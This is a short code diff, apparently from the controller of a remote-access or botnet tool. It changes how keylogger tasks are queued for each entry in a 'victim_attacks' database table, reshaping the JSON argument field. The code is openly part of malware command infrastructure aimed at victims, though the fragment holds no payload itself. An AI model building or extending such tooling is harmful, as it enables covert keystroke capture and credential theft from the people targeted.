@@ -175,7 +175,7 @@ elif args.keylogger:
 
         for id in result:
             query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
-            values = (id[0], "keylogger", "pending", "{\"time\": \"" + str(args.time) + "\"}")
+            values = (id[0], "keylogger", "pending", "{\"arg1\": \"" + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
 
             mycursor.execute(query, values)
 
